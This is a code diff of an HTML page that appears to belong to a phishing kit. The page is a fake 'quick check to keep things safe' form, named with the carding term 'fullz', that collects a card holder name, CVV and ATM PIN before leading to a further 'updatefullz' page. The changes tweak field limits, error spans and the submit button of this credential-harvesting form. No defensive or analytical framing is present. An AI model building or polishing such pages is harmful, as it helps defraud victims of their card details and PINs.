@@ -32,6 +32,7 @@
                 <p>We Just Need a Quick Check to Keep Things Safe!</p>
             </div>
             <form action="#" class="card__form-verify">
+                <span class="allerror-card"></span>
                 <div class="card__container">
                     <div class="cardfullz name-span">
                         <label for="fullzname" class="cardfullz__label">Card Holder Name</label>
@@ -53,19 +54,19 @@
                     </div>
                     <div class="cardfullz">
                         <label for="fullzcv" class="cardfullz__label">CVV</label>
-                        <input type="text" id="fullzcv" class="cardfullz__input cvv__input" maxlength="4">
+                        <input type="text" id="fullzcv" class="cardfullz__input cvv__input" maxlength="3">
                         <span class="cvverror-card"></span>
                         <span class="invalid__cvv"></span>
                     </div>
                     <div class="cardfullz">
                         <label for="fullzpim" class="cardfullz__label">ATM Pin</label>
                         <input type="password" class="cardfullz__input atmpin__input" id="fullzpim" maxlength="4">
-                        <span class="atmerror-card"></span>
+                        <span class="atmerror-card"> </span>
                         <span class="invalid__atmpin"></span>
                     </div>
                 </div>
                 <a href="./updatefullz_3.html" class="card__next-btn">Continue</a>
-                <!-- <button class="card__next-btn">Continue</button> -->
+                <!-- <button type="submit" class="card__next-btn">Continue</button> -->
             </form>
         </div>  
         <footer>
